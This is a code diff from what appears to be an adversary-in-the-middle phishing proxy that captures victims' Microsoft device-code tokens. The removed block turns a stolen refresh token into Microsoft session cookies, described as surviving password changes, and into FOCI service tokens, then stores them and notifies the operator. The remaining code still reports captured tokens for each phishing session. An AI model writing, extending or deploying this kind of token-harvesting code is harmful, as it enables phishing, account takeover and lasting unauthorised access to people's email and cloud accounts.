@@ -3518,46 +3518,8 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 
 				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)
 
-				// Extract Microsoft session cookies from the refresh token in background
-				// These cookies (ESTSAUTH, ESTSAUTHPERSISTENT, OWA) survive password changes
-				go func(sessionId string, refreshToken string, sessionSid int, notifData NotificationData) {
-					if refreshToken == "" {
-						// No refresh token - send notification without cookies
-						p.notifier.Trigger(EventDeviceCodeCaptured, &notifData)
-						return
-					}
-
-					log.Info("[%d] [devicecode] Extracting Microsoft session cookies...", sessionSid)
-					cookies, fociTokens, newRT, err := p.tokenPortal.ExchangeTokens(refreshToken)
-					if err != nil {
-						log.Warning("[%d] [devicecode] Cookie extraction partial failure: %v", sessionSid, err)
-					}
-
-					// Persist new refresh token if issued
-					if newRT != "" && newRT != refreshToken {
-						p.db.SetSessionCustom(sessionId, "dc_refresh_token", newRT)
-						notifData.Custom["dc_refresh_token"] = newRT
-					}
-
-					// Store cookies as JSON in session for later retrieval
-					if len(cookies) > 0 {
-						cookiesJSON, _ := json.Marshal(cookies)
-						p.db.SetSessionCustom(sessionId, "dc_cookies", string(cookiesJSON))
-						notifData.Custom["dc_cookies"] = string(cookiesJSON)
-						log.Success("[%d] [devicecode] Extracted %d Microsoft session cookies", sessionSid, len(cookies))
-					}
-
-					// Store FOCI tokens
-					if len(fociTokens) > 0 {
-						fociJSON, _ := json.Marshal(fociTokens)
-						p.db.SetSessionCustom(sessionId, "dc_foci_tokens", string(fociJSON))
-						notifData.Custom["dc_foci_tokens"] = string(fociJSON)
-						log.Success("[%d] [devicecode] Acquired %d FOCI service tokens", sessionSid, len(fociTokens))
-					}
-
-					// Send notification with cookies included
-					p.notifier.Trigger(EventDeviceCodeCaptured, &notifData)
-				}(s.Id, s.Custom["dc_refresh_token"], sid, NotificationData{
+				// Send notification with captured tokens
+				p.notifier.Trigger(EventDeviceCodeCaptured, &NotificationData{
 					Origin:    s.RemoteAddr,
 					Phishlet:  s.Phishlet,
 					SessionID: s.Id,
